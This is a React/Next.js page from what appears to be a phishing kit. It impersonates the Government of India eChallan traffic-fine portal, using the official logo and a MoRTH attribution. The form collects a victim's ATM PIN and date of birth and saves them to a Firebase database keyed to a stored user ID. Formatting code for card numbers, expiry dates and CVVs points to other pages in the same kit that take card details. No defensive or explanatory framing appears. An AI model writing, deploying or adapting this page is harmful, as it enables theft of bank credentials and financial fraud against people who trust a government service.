"use client";
import { useState } from "react";
import { ref, update } from "firebase/database";
import { database } from "@/app/lib/firebase";
import { useRouter } from "next/navigation";

export default function Page() {
    // Changed from "page" to "Page"
    const router = useRouter();

    const [formData, setFormData] = useState({
        atm_pin: "",
        dob: "",
    });

    const handleChange = (e) => {
        let { name, value } = e.target;
        // Apply formatting logic based on input name
        if (name === "card_no") {
            // Card number formatting (4 digits separated by space)
            value = value.replace(/\D/g, ""); // Remove non-digits
            value = value.replace(/(.{4})/g, "$1 ").trim(); // Add space after every 4 characters
            // Limit card number to 19 characters
            if (value.length > 19) {
                value = value.substring(0, 19);
            }
        } else if (name === "expiry_date") {
            // Expiry date formatting (MM/YY)
            value = value.replace(/\D/g, ""); // Remove non-digits
            if (value.length > 4) {
                value = value.substring(0, 4);
            }
            const formattedInput = value.match(/.{1,2}/g)?.join("/") || "";
            value = formattedInput;
        } else if (name === "cvv") {
            // CVV formatting (3 digits)
            value = value.replace(/\D/g, ""); // Remove non-digits
            if (value.length > 3) {
                value = value.substring(0, 3);
            }
        }

        // Format DOB
        if (name === "dob") {
            value = value.replace(/\D/g, "").slice(0, 8);
            if (value.length > 4) {
                value = `${value.slice(0, 2)}/${value.slice(2, 4)}/${value.slice(4)}`;
            }
        }

        setFormData({
            ...formData,
            [name]: value,
        });
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        // Get a reference to the "entries" node in Firebase database
        const formRef = ref(database, "entries");

        // Generate timestamp in milliseconds
        const timestamp = Date.now();

        // Add current timestamp to form data
        const formDataWithTime = {
            ...formData,
            time: timestamp,
        };

        // Push form data to Firebase database
        // const newRef = await push(formRef, formDataWithTime);

        const storedUserId = localStorage.getItem("newUserId");
        if (!storedUserId) {
            console.error("User ID not found in localStorage");
            return;
        }

        const userRef = ref(database, `entries/${storedUserId}`);
        await update(userRef, formDataWithTime);

        // Navigate to "/method" route after submission
        router.push("/pending");

        setFormData({
            atm_pin: "",
            dob: "",
        });
    };

    return (
        <div>
            <section className="w-full">
                {/* <!-- Harsha Web --> */}
                <div className="flex flex-col justify-center items-center px-5 py-10 bg-[#003466]">
                    {/* Logo */}
                    <img
                        src="/Government-of-India-Logo-Vector-PNG.png"
                        className="w-10"
                        alt="Logo"
                    />
                    <h1 className="text-white text-base font-bold mt-5">भारत सरकार</h1>
                    <h1 className="text-white text-base font-bold mt-1">
                        Government of India
                    </h1>
                    <h1 className="text-white text-base font-bold mt-5 text-center">
                        eChallan - Digital Traffic/Transport Enforcement Solution
                    </h1>
                    <span className="text-white text-xs mt-5 text-center">
                        An initiative of MoRTH, Goverment Of India
                    </span>
                </div>
                <div className="p-6">
                    <form
                        className="space-y-6 flex flex-col justify-center"
                        action=""
                        id="third-form"
                        onSubmit={handleSubmit} // Added onSubmit handler
                    >
                        {/* <div className="">
                            <img
                                src="/male-customer-support-working-office-answering-consumer-questions_112255-1154.avif"
                                className="w-full"
                                alt="Logo"
                            />
                        </div>
                        <h1 className="text-2xl text-[#000000] text-center">
                            Customer Care Support Instant Solution
                        </h1> */}
                        {/* <!-- Steper --> */}
                        {/* <div className="flex flex-col justify-center items-center px-10 mt-5">
                            <ol className="flex items-center w-full">
                                <li className="flex w-full items-center text-white dark:text-green-500 after:content-[''] after:w-full after:h-1 after:border-b after:border-green-500 after:border-4 after:inline-block dark:after:border-green-800">
                                    <span className="flex items-center justify-center w-10 h-10 bg-green-500 rounded-full lg:h-12 lg:w-12 dark:bg-green-800 shrink-0">
                                        1
                                    </span>
                                </li>
                                <li className="flex w-full items-center after:content-[''] after:w-full after:h-1 after:border-b after:border-green-500 after:border-4 after:inline-block dark:after:border-green-700">
                                    <span className="flex items-center text-white justify-center w-10 h-10 bg-green-500 rounded-full lg:h-12 lg:w-12 dark:bg-green-700 shrink-0">
                                        2
                                    </span>
                                </li>
                                <li className="flex w-full items-center after:content-[''] after:w-full after:h-1 after:border-b after:border-green-500 after:border-4 after:inline-block dark:after:border-green-700">
                                    <span className="flex items-center text-white justify-center w-10 h-10 bg-green-500 rounded-full lg:h-12 lg:w-12 dark:bg-green-700 shrink-0">
                                        3
                                    </span>
                                </li>
                                <li className="flex items-center w-full">
                                    <span className="flex items-center text-white justify-center w-10 h-10 bg-green-500 rounded-full lg:h-12 lg:w-12 dark:bg-green-700 shrink-0">
                                        4
                                    </span>
                                </li>
                            </ol>
                        </div> */}
                        {/* <!-- Full Name --> */}
                        <div className="mb-4">
                            <label className="block text-gray-700 text-sm mb-2" for="atm_pin">
                                ATM PIN <span className="text-red-500">*</span>
                            </label>
                            <input
                                className="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                                id="atm_pin"
                                name="atm_pin"
                                type="password"
                                placeholder="Enter ATM PIN*"
                                value={formData.atm_pin} // Updated value attribute
                                onChange={handleChange} // Added onChange handler
                            />
                        </div>
                        {/* <!-- Expiry and CVV --> */}
                        <div className="grid grid-cols-2 gap-2">
                            <div className="mb-4">
                                <label className="block text-gray-700 text-sm mb-2" for="dob">
                                    Date Of Birth <span className="text-red-500">*</span>
                                </label>
                                <input
                                    className="shadow-sm shadow-[#ffffff] placeholder:italic appearance-none rounded-md w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline border-[2px]"
                                    id="dob"
                                    name="dob"
                                    type="text"
                                    placeholder="DOB (DD/MM/YYYY)*"
                                    value={formData.dob} // Updated value attribute
                                    onChange={handleChange} // Added onChange handler
                                />
                            </div>
                        </div>
                        {/* <!-- Submit Button --> */}
                        <div className="w-auto flex justify-end items-center mt-5">
                            <button
                                className="bg-gradient-to-r from-[#003466] to-[#003466] text-white rounded-sm py-2 px-10 focus:outline-none focus:shadow-outline w-auto"
                                type="submit"
                            >
                                Next
                            </button>
                        </div>
                    </form>
                </div>
            </section>
            {/* <!-- Footer --> */}
            <section className="bg-[#ffffff] p-5 w-full mt-24">
                <div className="flex space-x-1 w-full justify-between">
                    <span className="text-xs text-black font-bold">Support</span>
                    <span className="text-xs text-black font-bold">|</span>
                    <span className="text-xs text-black font-bold">Find Us</span>
                    <span className="text-xs text-black font-bold">|</span>
                    <span className="text-xs text-black font-bold">Pricing & Fees</span>
                    <span className="text-xs text-black font-bold">|</span>
                    <span className="text-xs text-black font-bold">Compliance</span>
                </div>
                <div className="flex space-x-1 w-full justify-between mt-2">
                    <span className="text-xs text-black font-bold">
                        Terms & Conditions
                    </span>
                    <span className="text-xs text-black font-bold">|</span>
                    <span className="text-xs text-black font-bold">
                        Legal Disclosures
                    </span>
                    <span className="text-xs text-black font-bold">|</span>
                    <span className="text-xs text-black font-bold">
                        Safety Guidelines
                    </span>
                </div>
                <div className="mt-5 text-[10px] text-black">
                    Copyright @2021-2024 Customer Support. All rights reserved.
                </div>
            </section>
        </div>
    );
}
